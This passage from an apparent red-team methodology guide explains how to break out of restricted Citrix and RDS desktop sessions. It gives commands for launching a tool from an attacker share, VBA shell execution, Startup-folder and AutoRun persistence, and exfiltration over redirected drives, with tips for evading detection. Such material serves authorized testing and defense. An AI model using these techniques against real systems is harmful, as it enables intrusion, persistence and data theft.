Get-Service | Where-Object { $_.DisplayName -match 'Citrix|Horizon|VMware|RDAgent|RDInfra|FSLogix|Terminal' } |
  Format-Table Name, DisplayName, Status
Get-ChildItem 'C:\Program Files','C:\Program Files (x86)' -ErrorAction SilentlyContinue |
  Where-Object Name -match 'Citrix|Omnissa|VMware|RDInfra|FSLogix'
reg query HKLM\SOFTWARE\Citrix /s /f Version 2>nul
```

Version matters because the platform agents and their supporting services have their own local privilege escalation history, and because the management-plane vulnerabilities are version-gated.

#### What restricts me, and by what mechanism

This is the question that decides your approach, and the answer is usually a stack of several mechanisms rather than one. Establish each layer separately.

| Layer | Enforced by | How to detect it | What it does not stop |
| --- | --- | --- | --- |
| Initial program / published app | Session host RDS `TSAppAllowList`, or the Citrix broker | You have no `explorer.exe` and no taskbar | Any process launched by your application |
| Shell policy (`NoRun`, `RestrictRun`, `DisallowRun`, `NoViewContextMenu`) | `explorer.exe` itself | Registry under `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` | Anything not launched through explorer |
| `DisableCMD` | `cmd.exe` itself | `HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD` | Every other interpreter, and batch files if the value is `2` |
| AppLocker | Kernel, `AppIDSvc` | `Get-AppLockerPolicy -Effective`, event log `Microsoft-Windows-AppLocker` | Covered in the Windows Post-Exploitation section |
| WDAC | Kernel, code integrity | `CiTool`, `Microsoft-Windows-CodeIntegrity/Operational` | Covered in the Windows Post-Exploitation section |
| PowerShell Constrained Language Mode | PowerShell engine | `$ExecutionContext.SessionState.LanguageMode` | Non-PowerShell execution |
| Platform policy (Citrix policy, RDP redirection GPOs, AVD RDP properties) | Platform agent and display protocol stack | Citrix Group Policy Modeling wizard, RDSH device redirection GPO values | Local execution; these mostly govern redirection, not code |
| Kiosk shell replacement | Winlogon `Shell` value, Shell Launcher, Assigned Access | `HKLM`/`HKCU\...\Winlogon\Shell` | Processes started by the kiosk application |

The crucial structural point in that table: `RestrictRun`, `DisallowRun` and `NoRun` are implemented inside `explorer.exe`. They are a user-interface restriction, not a security boundary, and any process creation that does not route through the shell ignores them entirely. A scheduled task, a WMI `Win32_Process.Create`, a `.lnk` launched by a different host process, a script engine calling `CreateProcess`, a service, or a child process of your published application, all sail straight through. Operators lose hours attacking `RestrictRun` as if it were AppLocker. It is not. Confirm which one you are actually facing before choosing a technique, because AppLocker and WDAC genuinely do require the bypass material in the Windows Post-Exploitation section while shell policy requires nothing but a different launcher.

Enumerate the policy layer directly:

```cmd
gpresult /r /scope:user
gpresult /h %TEMP%\rsop.html
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /s
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /s
reg query "HKCU\Software\Policies\Microsoft\Windows\System" /s
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
```

The values that matter, with what each one means:

| Registry value | Hive and path | Effect |
| --- | --- | --- |
| `NoRun` | `HKCU\...\Policies\Explorer` | Removes the Run box from the Start menu |
| `RestrictRun` | `HKCU\...\Policies\Explorer` plus a `RestrictRun` subkey of numbered allow entries | Explorer will only launch the named executables |
| `DisallowRun` | `HKCU\...\Policies\Explorer` plus a `DisallowRun` subkey of numbered deny entries | Explorer refuses the named executables |
| `NoViewContextMenu` | `HKCU\...\Policies\Explorer` | Removes the shell context menu, which kills the file dialog right-click route |
| `NoDrives` | `HKCU\...\Policies\Explorer` | Hides drive letters in shell views. Cosmetic; typed paths still work |
| `NoControlPanel`, `NoFolderOptions`, `NoFind` | `HKCU\...\Policies\Explorer` | Removes shell entry points |
| `DisableTaskMgr` | `HKCU\...\Policies\System` | Blocks Task Manager, removing the "Run new task" launcher |
| `DisableRegistryTools` | `HKCU\...\Policies\System` | Blocks `regedit`. Does not block `reg.exe` or the .NET registry APIs |
| `DisableCMD` | `HKCU\Software\Policies\Microsoft\Windows\System` | `1` blocks `cmd.exe` and batch script processing, `2` blocks the interactive prompt but **permits batch files** |

`DisableCMD = 2` is common and is a gift, because it means `.bat` and `.cmd` files still execute. The check is implemented inside `cmd.exe` and only refuses the interactive prompt. Any route that gets a batch file written and launched still gives you command execution.

#### What can I see, and what is redirected

Enumerate the filesystem, the drives and the redirection channels, because redirection is your tooling ingress and your data egress.

```cmd
net use
wmic logicaldisk get deviceid,drivetype,providername,volumename
dir \\tsclient\ 
dir \\Client\C$\
dir "%USERPROFILE%"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
dir C:\Windows\System32\cmd.exe
```

`\\tsclient\<drive letter>` is the Remote Desktop Services client drive redirection namespace. `\\Client\C$` is the Citrix client drive mapping namespace: with client drive mapping enabled and client folder redirection not in use, whole client volumes are presented into the session as UNC links under `\\Client\`. Both are read-write by default and both are a direct route to bring in your own binaries and take out your own loot, with your own endpoint as the far end of the channel.

Test the other channels explicitly rather than assuming:

- **Clipboard**: copy text out of the session and into your local editor, and back. Both directions may be independently restricted. File-format clipboard (copying a file object) is separately governed from text.
- **Printers**: a redirected client printer means a print path, and printing to file is an arbitrary file write.
- **USB**: generic USB redirection would let you present mass storage, though it is usually the first thing disabled.
- **Drive mapping**: as above.
- **File transfer**: the HTML5 and browser-delivered clients have their own upload and download controls separate from drive mapping.

#### Network reachability from the session host

This is frequently the most valuable single output of the recon phase and it is routinely under-exploited. A session host sits inside the server estate. It is domain-joined, it has a service account or machine account, it needs to reach domain controllers, file servers, licence servers, SQL servers, the profile share and often much more. Your own testing machine sits on a segment that has been deliberately firewalled. The session host's reachability is therefore usually far better than yours, and turning the session host into a pivot is often worth more than anything you find on it.

```powershell
nltest /dsgetdc:$DOMAIN
nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN
Get-NetIPConfiguration | Format-List
Get-NetRoute -AddressFamily IPv4 | Sort-Object -Property RouteMetric
netstat -ano
Test-NetConnection $TARGET -Port 445
```

`netstat -ano` on a session host is unusually informative because it shows the established connections of every logged-on user, which maps out the applications, servers and databases the user population actually talks to. That is a target list you did not have to scan for. Cross-reference the Network Enumeration section for what to do with it and the Lateral Movement section for turning the host into a relay.

### Breakout by mechanism

Organised by the thing being abused rather than as a list of tricks, because the specific trick changes with every application and the mechanism does not. For each: what the mechanism is, what to do, and what a restriction that blocks it looks like.

#### The shell-hosted file dialog

**What it is.** The Open and Save As dialogs in a Windows application are not simple text boxes. Since Vista the Common Item Dialog is a hosted instance of the shell's own file browser, operating over the shell namespace via `IShellItem` rather than over plain filesystem paths. It carries the shell's navigation pane, the shell's address bar, the shell's context menu, shell moniker resolution, environment variable expansion and UNC handling. In other words, opening a Save As dialog in a published application hands you a substantial fraction of Windows Explorer inside a process that was never supposed to give you one.

**Why it works.** The dialog is a shell component doing what the shell does. Path text entered into the file name field or the address bar is resolved by the shell, so it navigates folders, expands `%VARIABLES%`, follows UNC paths, resolves `shell:` monikers, and, when the resolved item is executable and the shell is asked to open it, launches it. The context menu in the file list is the real shell verb menu, which includes Open, Open with, Run as administrator, Send to, and New. `New > Shortcut` is the important one: it is a general-purpose "create a launcher for an arbitrary target with arbitrary arguments" wizard, and it exists inside a dialog in an application that was supposed to be locked down.

**Preconditions.** Any code path in the published application that opens a common file dialog. The usual triggers are Ctrl+O, Ctrl+S, Ctrl+P then a print-to-file destination, an import or export function, an attach-file function, an "browse for template" or "browse for certificate" option, and an application settings page with a path picker. In browsers, `Save page as`, `Print`, and any `<input type=file>` element also open one.

**Commands.** There is nothing to type at a prompt; this is interface work. The sequence to run, in order of speed:

```text
1. Type into the file name box or address bar and press Enter:
     C:\Windows\System32\cmd.exe
     %COMSPEC%
     powershell.exe
     \\$ATTACKER\share\tool.exe
2. If typed launch is refused, right-click in the file list:
     Open, or Open with > Choose another app, on a browsed-to executable
     New > Shortcut, target C:\Windows\System32\cmd.exe, then launch the shortcut
     Send to > (an entry you have planted, see below)
3. If the file list is empty or restricted, navigate by shell moniker in the address bar:
     shell:System
     shell:ProfileFolder
     shell:Startup
     shell:AppData
     shell:ControlPanelFolder
     shell:RecycleBinFolder
4. Rename a file you can write to an executable extension, then Open it.
```

**Verify it worked.** A console window appears, or the target process appears in the application's own process tree. Confirm with `whoami` and `echo %SESSIONNAME%` so you know which identity and session you landed in, which is not always the same as the application's identity if the application impersonates.

**Detection and opsec.** The loudest artefact is process ancestry. `WINWORD.EXE` or `AcroRd32.exe` or `msedge.exe` as the parent of `cmd.exe` is one of the highest-fidelity detections in existence and every EDR ships it as a default rule. If a shell is what you need, get one, but assume it is noticed, and prefer to use the dialog to plant and launch a loader in a single step rather than sitting in an interactive `cmd.exe` under a document editor. Shortcut creation in a user profile is a lower-signal artefact than a shell spawn.

**Failure modes.** The application uses a custom, non-shell file browser (common in kiosk-hardened line-of-business applications and in some Java and Electron applications), in which case there is no shell namespace behind it and none of this applies. `NoViewContextMenu` is set, removing the right-click routes but usually leaving typed navigation. AppLocker or WDAC blocks the launched binary, which is a kernel-level refusal and needs the material in the Windows Post-Exploitation section rather than a different dialog. The dialog is modal and filtered to a single extension, which restricts what you see but not what you can type.

**Common mistake.** Concluding that the technique failed because typing `cmd.exe` did nothing. In many dialogs typing a file name simply returns that name to the calling application, and you need to actually navigate to the binary and use the context menu Open verb, or create a shortcut. Try all three routes before writing the dialog off.

#### Help, support and "about" features

**What it is.** Help systems are process launchers with a friendly face. F1, a Help menu, an "About" box with a hyperlink, a "Check for updates" button, a "Contact support" link, a "View log file" button and a "Open containing folder" button are all requests for the application to invoke something outside itself.

**Why it works.** `ShellExecute` and its relatives are the standard way to open help content, and they resolve the target through the shell's file association and protocol handler tables. HTML Help (`hh.exe`) renders CHM content, and CHM has historically supported shortcut objects that invoke programs. A "View log file" button typically calls `ShellExecute` on a `.log` path, and `.log` is associated with Notepad, which gives you a text editor with a Save As dialog, which gives you the previous section. An "Open containing folder" button calls `explorer.exe /select,<path>`, which gives you an actual Explorer window in a session where explorer was supposed to be unreachable.

**Preconditions.** The application exposes any of those features and the corresponding handler is present and not blocked.

**Commands.** Interface work again. Enumerate every menu, every dialog, every right-click and every button in the published application before doing anything else; the breakout is very often sitting in a menu.

```text
F1                      -> help viewer or browser
Help > About > link     -> default browser or protocol handler
"Open log folder"       -> explorer.exe /select,<path>
"View log"              -> notepad.exe <path>  -> Ctrl+O / Ctrl+S
"Check for updates"     -> browser, or an updater process you may be able to influence
```

**Detection and opsec.** Low, because these are normal application behaviours. The follow-on process spawn is where the signal is.

**Failure modes.** Help content stripped from the deployment. `hh.exe` blocked by application control, which is a common hardening step. The Help menu points at an intranet URL that opens in an embedded browser with no chrome and no context menu.

#### Embedded browsers and hyperlink handling

**What it is.** Almost every modern application embeds a browser control (WebView2, CEF, or an Electron renderer) or hands hyperlinks off to the system default browser. Either path is a rich breakout surface.

**Why it works.** A full browser is one of the most capable launchers on the system. It has a Save As dialog, a Print dialog with a print-to-file destination, a Downloads pane with "Show in folder", a developer tools console, a file upload control that opens a shell file dialog, and an address bar that resolves `file:///` URIs and registered protocol handlers. Chromium developer tools in particular give you a JavaScript console and a workspace folder picker, both of which reach the filesystem, and the Performance and Sources panels open native file dialogs.

Hyperlink handoff works because clicking a link calls `ShellExecute` on the URI, and the shell dispatches on the scheme using the handler registered in `HKCU\Software\Classes` first and `HKLM\Software\Classes` second. `file:` reaches the filesystem. Application protocol handlers reach whatever the registering application does with the rest of the URI, and the history of that surface (the `ms-msdt:` handler abused by Follina, the `search-ms:` handler used to open a controlled search results window, `ms-officecmd:`) shows how much reach it has. Vendors patch individual handlers; the pattern recurs because the mechanism is by design.

**Preconditions.** An embedded browser or a working hyperlink handoff, and a browser installation that has not had developer tools and Save As disabled by policy.

**Commands.**

```text
In an embedded or full browser:
  Ctrl+O                          -> file open dialog
  Ctrl+S                          -> save as dialog
  Ctrl+P -> Save as PDF / Print to file -> save as dialog
  Ctrl+Shift+I -> Console         -> document.write('<input type=file>') then click it
  Ctrl+Shift+I -> Sources -> Add folder to workspace -> folder picker
  Downloads pane -> Show in folder -> explorer window
  Address bar:
    file:///C:/Windows/System32/
    file:///C:/
```

Enumerate what protocol handlers exist in the session, because that list is environment-specific and occasionally contains something that takes a command-line-shaped argument:

```powershell
Get-ChildItem 'HKCU:\Software\Classes' | Where-Object { $_.Property -contains 'URL Protocol' } | Select-Object PSChildName
Get-ChildItem 'HKLM:\SOFTWARE\Classes' | Where-Object { $_.Property -contains 'URL Protocol' } | Select-Object PSChildName
```

**Detection and opsec.** Browser-parented shells are heavily alerted on. Developer tools usage is logged by some managed browser configurations. The `file:///C:/` navigation itself is usually invisible.

**Failure modes.** Developer tools disabled by browser policy, which in Edge and Chrome is a supported enterprise setting and is set in hardened VDI. Save As and printing disabled by policy. The embedded control is configured with no context menu and no keyboard shortcuts, which is common in purpose-built kiosk applications. AppLocker blocking the child process.

#### Application scripting and macro engines

**What it is.** Any published application that contains a scripting or extension engine contains a code execution primitive that has nothing to do with the shell, is not affected by `RestrictRun`, and often looks entirely legitimate.

**Why it works.** The engine is designed to run code the user supplies. It runs in-process, as your user, and typically has access to whatever automation objects the host application exposes plus, in the common case of a COM-capable engine, the whole COM registry including `WScript.Shell` and `Scripting.FileSystemObject`. The restriction that would block it is a policy inside the application, not an operating system control, so the OS-level lockdown you are fighting is simply not in the path.

**Where to look.** Work through this list against whatever is published. It is a checklist, not a set of instructions, because the syntax is per-application.

| Published application | Engine or escape |
| --- | --- |
| Word, Excel, PowerPoint, Access, Outlook, Publisher, Visio | VBA, the VBE immediate window, the Office object model |
| Excel specifically | Also Power Query M, `WEBSERVICE()`, legacy XLM macro sheets where still permitted |
| LibreOffice or OpenOffice | Basic macros, `Shell()`, the Basic IDE |
| SQL Server Management Studio | `xp_cmdshell` on any reachable instance, CLR, Agent jobs, the "Start PowerShell" node action; see the MSSQL material in the Enterprise Services section |
| Any database client | Command execution features of the target database engine |
| PuTTY, KiTTY | Proxy type "Local" with a local command line, which runs a program of your choosing on the client machine to establish the connection |
| WinSCP, FileZilla | Local file browser, local command execution and "open in terminal" features |
| Notepad++ | Plugin manager, and the NppExec plugin where installed |
| 7-Zip, WinRAR | Built-in file manager with an Open-with verb |
| Adobe Acrobat and Reader | Document JavaScript, `app.launchURL`, attachments |
| AutoCAD | AutoLISP and VBA |
| SAP GUI | SAP GUI Scripting |
| Power BI Desktop | Power Query M, and R or Python script visuals where the runtimes are installed |
| Any Java application | An exposed scripting console, a plugin directory, or a configurable "external tool" path |
| Any application with a "run external tool" setting | Exactly what it says |

**Detection and opsec.** Macro-engine execution is very well instrumented in Office specifically, both by AMSI (which sees VBA macro content) and by EDR rules on Office child processes. Non-Office engines are far less instrumented and are correspondingly the better choice where you have a choice. A published SSMS is both the most powerful and the least surprising, because a database administrator running PowerShell from SSMS is ordinary.

**Failure modes.** The engine is disabled by application policy. The application is a locked deployment with the scripting components not installed. AMSI blocks the macro body. The engine exists but is sandboxed away from COM.

#### The Office object model specifically

**What it is.** Where an Office application is published, you have the richest scripting environment on the platform. VBA is a full language with COM access, running in-process as your user.

**Why it works.** VBA's `Shell` function and the `WScript.Shell` COM object both create processes. `Scripting.FileSystemObject` reads and writes files. The whole COM registry is reachable, which means `MSXML2.XMLHTTP` for HTTP, `ADODB.Stream` for binary file writes, and the Office object models of the other installed applications. None of this routes through `explorer.exe`, so shell policy is irrelevant.

**Preconditions.** Macro execution permitted for the document you are working in. The Trust Center's `VBAWarnings` value governs the prompt behaviour, the separate "block macros from files from the internet" control is Mark-of-the-Web based and therefore does not apply to a macro you type into a document you created inside the session, and a `VBAOff`-style deployment setting removes VBA entirely. Check the first, exploit the second, and if the third is set look for a different engine. <!-- VERIFY exact registry value names and paths for VBAWarnings and the VBA-disable deployment setting in current Office builds -->

```cmd
reg query "HKCU\Software\Microsoft\Office" /s /f VBAWarnings
reg query "HKCU\Software\Policies\Microsoft\Office" /s /f VBAWarnings
```

**Commands.** Open the VBA editor with Alt+F11, then the Immediate window with Ctrl+G, and evaluate a line directly. The Immediate window is the fastest route because it needs no document, no module and no macro-enabled save.

```vbnet
' Immediate window, one line, executes on Enter:
Shell "cmd.exe /c whoami > %TEMP%\o.txt", 0

' Same via COM, which does not go near the shell policy either:
CreateObject("WScript.Shell").Run "cmd.exe /c whoami > %TEMP%\o.txt", 0, True

' Arbitrary file write, for staging a payload or a batch file:
With CreateObject("Scripting.FileSystemObject").CreateTextFile("%TEMP%\r.bat", True)
    .WriteLine "whoami"
    .Close
End With
```

For egress and ingress without a shell at all, Excel formulas alone reach the network. `WEBSERVICE()` performs an HTTP GET from a formula, which is both an exfiltration channel and a way to test whether the session host has outbound web access, and Power Query's `Web.Contents` does the same with more control. Neither needs macros enabled.

**Verify it worked.** Read back the file you wrote. Do not rely on the absence of an error dialogue; VBA fails quietly in plenty of situations.

**Detection and opsec.** AMSI inspects VBA macro content at runtime in current Office, so obvious strings are seen. Office spawning `cmd.exe` or `powershell.exe` is an ASR rule ("Block Office applications from creating child processes") and a default EDR detection. The COM route via `WScript.Shell` still results in a child process and is caught by the same rule. Writing a file and having something else run it later breaks the parent-child link and is quieter. Excel `WEBSERVICE()` traffic appears as Excel making an HTTP request, which is unremarkable.

**Failure modes.** ASR child-process blocking, which produces a silent failure or an Office error rather than a clear message and is the single most likely thing to stop you in a current estate. AMSI detection of the macro body. VBA removed from the deployment. Protected View, which disables everything until you leave it.

#### Print, export and save-as as an arbitrary file write

**What it is.** Even where you cannot get execution directly, almost every application can write a file somewhere of your choosing. An arbitrary file write with an attacker-chosen path is a code execution primitive on Windows, because there are numerous locations where the operating system or another process will execute what it finds.

**Why it works.** The Save As dialog lets you choose the directory and, with the file type set to "All Files", the extension. The user profile's Startup folder is executed at every logon. `.lnk`, `.url`, `.bat`, `.cmd`, `.vbs`, `.js` and `.wsf` files placed there run without further interaction. In a profile-managed environment the Startup folder is inside the roaming profile or the FSLogix container, so the file survives the host being destroyed and follows you to the next session host.

Printing gives the same primitive by a different route. A print-to-file destination asks you for an output path, and where the driver is a plain-text driver the output is very close to the literal document text, which makes it a way to produce a batch file from a document. The PDF and XPS writers produce binary output, but they still let you choose the path, which is enough when the goal is to drop a file where a watched directory or a scheduled task will consume it.

**Preconditions.** Any save, export, save-a-copy, attach, or print-to-file function. Write access to the target directory, which for your own profile you have by definition.

**Commands.**

```text
Save As, file type "All Files", into:
  %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\x.bat
  %APPDATA%\Microsoft\Windows\SendTo\shell.lnk
  %USERPROFILE%\Documents\ (then launch via the dialog context menu)

Content for a .url file that launches a program at logon:
  [InternetShortcut]
  URL=file:///C:/Windows/System32/cmd.exe
```

The `SendTo` route deserves calling out on its own. `%APPDATA%\Microsoft\Windows\SendTo` is user-writable and populates the shell's Send To context submenu. Drop a shortcut to `cmd.exe` there and every shell context menu in the session, including the ones inside file dialogs, now contains a launcher for it, with the right-clicked file passed as an argument.

**Verify it worked.** List the directory and confirm the file and its extension. Watch for the dialog silently appending `.txt` or the application's native extension, which is the usual reason this appears to fail.

**Detection and opsec.** File creation in Startup folders is a monitored persistence location (ATT&CK T1547.001) and is one of the better-covered detections in any EDR. Creation of a `.lnk` in `SendTo` is much less commonly alerted. A file written and then executed at next logon has clean parentage, `explorer.exe` as parent, which is a real opsec advantage over spawning from the application.

**Failure modes.** The dialog forces its own extension. The Startup folder is redirected somewhere you cannot write, or is excluded from the profile container. AppLocker's default rules deny execution from user-writable paths, which blocks the `.bat` and `.exe` variants while leaving `.lnk` pointing at a signed system binary working; that asymmetry is worth remembering.

#### Environment variable and search path manipulation

**What it is.** Turning "some other process launches a helper" into "some other process launches my code", by controlling how the helper's name resolves.

**Why it works.** `HKCU\Environment` is writable by the user and its `Path` and `PATHEXT` values are merged into the environment of processes started after the next logon or environment refresh. Any application that launches a helper by bare name rather than full path resolves it through that `Path`. Separately, `HKCU\Software\Microsoft\Command Processor\AutoRun` names a command that `cmd.exe` executes on every start, which converts any situation where something else spawns a command processor into execution of your choosing. Both are per-user, need no elevation, and live inside the profile so they persist in a non-persistent environment.

**Preconditions.** Write access to your own `HKCU`, which unless the hive is locked down you have. A subsequent process launch that resolves a name through `Path`, or a subsequent `cmd.exe` launch for the AutoRun variant.

**Commands.**

```cmd
reg add "HKCU\Environment" /v Path /t REG_EXPAND_SZ /d "%APPDATA%\bin;%Path%" /f
reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%APPDATA%\bin\a.bat" /f
```

The general DLL search order and unquoted service path surface, which is the same mechanism applied to libraries and services rather than to path resolution, is covered in the Windows Post-Exploitation section and is not repeated here. It is worth checking on a session host specifically because published application directories are sometimes writable by the user population, which on a shared host means a DLL you plant executes in every other user's copy of that application.

**Detection and opsec.** Registry writes to `HKCU\Environment` and to the Command Processor `AutoRun` value are both monitored persistence locations. `AutoRun` in particular is a well-known detection.

**Failure modes.** No new process launch happens before your session ends. The application uses fully qualified paths, which good applications do. AppLocker blocking execution from the writable directory you added to `Path`.

#### Drive redirection as tooling ingress

**What it is.** Using the display protocol's own client drive redirection to move your tooling into the session and your loot out, with your own endpoint as the far end.

**Why it works.** Client drive redirection exists so users can open a document from their laptop inside the session. It is implemented as a virtual channel in the display protocol, terminating in a redirector that presents the client's volumes inside the session as a UNC namespace or as mapped drives. From the session's point of view it is a filesystem. From the network's point of view it is display protocol traffic, which means it traverses whatever path the display protocol traverses and is not subject to the session host's own egress firewalling at all. On a session host with no internet access and no SMB egress, redirected client drives may be the only bidirectional data channel you have, and they are a very good one.

**Preconditions.** Drive redirection enabled. On the RDS side that is a client-side request in the `.rdp` file (`drivestoredirect:s:*`, `redirectdrives:i:1`) that the session host may refuse via the Device and Resource Redirection group policy. On the Citrix side it is the client drive mapping Citrix policy, applied by the VDA. Client-side settings only ever *request* redirection; the server decides.

**Commands.**

```cmd
:: Enumerate what is actually redirected
net use
dir \\tsclient\
dir \\Client\

:: RDS: copy a tool in, copy loot out
copy \\tsclient\C\tools\loader.exe %APPDATA%\loader.exe
copy %TEMP%\loot.zip \\tsclient\C\out\

:: Citrix: same, different namespace
copy \\Client\C$\tools\loader.exe %APPDATA%\loader.exe
```

Note that executing directly from `\\tsclient\` or `\\Client\` is sometimes possible and sometimes not, and where it is possible it puts your binary outside the local filesystem entirely, which has both evasion advantages and reliability disadvantages. Test both.

**Verify it worked.** The file appears with the right size and hash on the other side. Check the hash, because redirected channels have byte limits and truncation behaviours.

**Detection and opsec.** Drive redirection is exactly what data loss prevention tooling on a third-party VDI is configured to watch, because it is the obvious exfiltration route. Assume file names and sizes are logged and possibly content-inspected. Bringing a known-bad binary in over a redirected drive will be caught by the session host's endpoint protection on write. The channel itself being present is unremarkable; what you move over it is not.

**Failure modes.** Redirection disabled by policy, which is the norm in properly hardened third-party access. Read-only redirection. Endpoint protection quarantining on write. The redirector service not running in the session.

#### The clipboard as a transfer channel

**What it is.** Where drive redirection is disabled but clipboard redirection is not, the clipboard is a working, if tedious, bidirectional transfer channel.

**Why it works.** Clipboard redirection synchronises clipboard contents between client and session over a virtual channel. Text goes both ways. Base64 turns a binary into text. Therefore a binary can be moved by clipboard, in chunks sized under whatever clipboard size limit is enforced, reassembled in the session by a text editor plus `certutil -decode` or by a script.

**Preconditions.** Clipboard redirection enabled in the direction you need.
